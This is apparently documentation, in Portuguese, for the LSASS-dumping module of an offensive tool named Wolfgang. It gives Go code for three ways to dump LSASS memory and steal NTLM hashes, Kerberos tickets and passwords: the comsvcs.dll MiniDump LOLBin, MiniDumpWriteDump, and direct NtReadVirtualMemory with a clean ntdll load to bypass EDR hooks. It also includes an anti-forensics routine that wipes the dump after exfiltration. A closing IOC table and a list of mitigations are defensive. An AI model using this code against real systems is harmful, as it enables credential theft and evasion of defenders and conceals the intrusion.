    LSASS Dumping¶

    O que é¶

    LSASS (Local Security Authority Subsystem Service) é o processo do Windows responsável por autenticação local e de domínio. Ele mantém em memória credenciais dos usuários com sessões ativas: NTLM hashes, Kerberos tickets (TGT/TGS), e em alguns casos senhas em texto claro (WDigest, CredSSP).

    O LSASS dumping consiste em ler a memória desse processo e salvar em um arquivo no formato minidump, que pode ser parseado offline com ferramentas como mimikatz, pypykatz ou secretsdump.

    O Wolfgang oferece três técnicas de dump, cada uma com um trade-off diferente entre complexidade e evasão.

    Por que funciona¶

    O LSASS é um processo userland. Qualquer processo com SeDebugPrivilege (geralmente SYSTEM ou administradores elevados) pode abrir seu handle com PROCESS_VM_READ e ler sua memória diretamente.

    As credenciais ficam em memória porque o Windows precisa delas para:

    • SSO (Single Sign-On): re-autenticar o usuário em recursos de rede sem pedir senha
    • Kerberos ticket renewal: renovar TGTs automaticamente
    • NTLM authentication: responder a challenges de autenticação em name of the user

    A Microsoft introduziu o Credential Guard (VBS-based isolation) e PPL (Protected Process Light) para proteger o LSASS, mas ambos requerem configuração explícita e não estão habilitados por padrão na maioria dos ambientes.

    Implementação no Wolfgang¶

    O módulo lsass_dump (pkg/module/credential/lsass.go) aceita o parâmetro technique com três valores possíveis:

    Técnica 1: comsvcs.dll (LOLBin)¶

    A técnica mais simples. Usa rundll32.exe para chamar MiniDump exportada por comsvcs.dll -- uma DLL legítima do Windows:

    func dumpViaComsvcs(ctx context.Context, pid uint32, outPath string) error {
    arg := fmt.Sprintf("%d %s full", pid, outPath)
    cmd := exec.CommandContext(ctx, "rundll32.exe", "comsvcs.dll,MiniDump", arg)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    return cmd.Run()
}

    Vantagem: Usa apenas binários legítimos do Windows (LOLBin). Desvantagem: rundll32.exe acessando lsass.exe é um dos IOCs mais monitorados.

    Técnica 2: MiniDumpWriteDump (API direta)¶

    Chama MiniDumpWriteDump do dbghelp.dll diretamente via syscall:

    func dumpViaMiniDump(pid uint32, outPath string) error {
    hProcess, err := winapi.OpenProcess(winapi.ProcessAllAccess, false, pid)
    if err != nil {
        return fmt.Errorf("OpenProcess: %w", err)
    }
    defer winapi.CloseHandle(hProcess)

    f, err := os.Create(outPath)
    if err != nil {
        return fmt.Errorf("create output file: %w", err)
    }
    defer f.Close()

    ret, _, callErr := procMiniDumpWriteDump.Call(
        hProcess, uintptr(pid), f.Fd(),
        miniDumpWithFullMemory, 0, 0, 0,
    )
    if ret == 0 {
        os.Remove(outPath)
        return fmt.Errorf("MiniDumpWriteDump: %v", callErr)
    }
    return nil
}

    Vantagem: Não spawna processos filhos (sem rundll32.exe no process tree). Desvantagem: OpenProcess no LSASS + chamada a dbghelp.dll são hooks comuns de EDR.

    Técnica 3: NtReadVirtualMemory (Direct Syscall)¶

    A técnica mais evasiva. Lê a memória do LSASS diretamente via NtReadVirtualMemory, carregando uma cópia limpa de ntdll.dll do disco para bypassar hooks de EDR:

    func getCleanNtReadVirtualMemory() (*windows.Proc, error) {
    cleanNtReadOnce.Do(func() {
        dll, err := windows.LoadDLL(`C:\Windows\System32\ntdll.dll`)
        if err != nil {
            cleanNtReadErr = err
            return
        }
        cleanNtRead, cleanNtReadErr = dll.FindProc("NtReadVirtualMemory")
    })
    return cleanNtRead, cleanNtReadErr
}

    O dump é construído manualmente: enumera módulos via EnumProcessModulesEx, varre regiões de memória com VirtualQueryEx, e lê cada região committed com NtReadVirtualMemory. O resultado é serializado no formato minidump pelo MinidumpWriter:

    func dumpViaDirect(pid uint32, outPath string) error {
    hProcess, err := winapi.OpenProcess(processQueryInfo|processVMRead, false, pid)
    // ...
    writer := NewMinidumpWriter()
    enumerateModules(hProcess, writer)
    enumerateAndReadMemory(hProcess, writer)
    // ...
    writer.Write(f)
}

    Vantagem: Bypass de hooks em ntdll.dll, não usa dbghelp.dll, menor footprint. Desvantagem: Implementação mais complexa; precisa produzir minidump válido.

    Verificações pré-dump¶

    Antes de qualquer técnica, o módulo verifica se o LSASS está protegido por PPL:

    func isProcessPPL(pid uint32) bool {
    handle, err := winapi.OpenProcess(processQueryLimitedInformation, false, pid)
    // ...
    ret, _, _ := procNtQueryInformationProcess.Call(
        handle, 61, // ProcessProtectionInformation
        uintptr(unsafe.Pointer(&protection[0])), 1,
        uintptr(unsafe.Pointer(&retLen)),
    )
    return protection[0] != 0
}

    Anti-forensics¶

    Após exfiltração do dump, CleanupDumpFile sobrescreve o arquivo com zeros antes de deletar:

    func CleanupDumpFile(path string) error {
    f, _ := os.OpenFile(path, os.O_WRONLY, 0)
    zeros := make([]byte, 4096)
    remaining := info.Size()
    for remaining > 0 {
        written, _ := f.Write(zeros[:n])
        remaining -= int64(written)
    }
    f.Close()
    return os.Remove(path)
}

    Detecção¶

    IOC Técnica Descrição
    rundll32.exe acessando lsass.exe comsvcs Criação de processo com alvo LSASS
    OpenProcess(PROCESS_ALL_ACCESS) no PID do LSASS minidump Handle com permissões amplas
    Chamada a MiniDumpWriteDump minidump Hook em dbghelp.dll
    NtReadVirtualMemory em grande volume direct Padrão de leitura sequencial de regiões
    Arquivo .dmp em diretório temporário todas Presença do dump em disco
    Sysmon Event ID 10 (ProcessAccess) todas Log de acesso ao processo LSASS

    Mitigações efetivas:

    • Credential Guard: Isola credenciais em enclave VBS, fora do alcance do LSASS
    • PPL habilitado para LSASS: Bloqueia OpenProcess de processos não-protegidos
    • LSA Protection (RunAsPPL): Registry key RunAsPPL=1 em HKLM\SYSTEM\CurrentControlSet\Control\Lsa
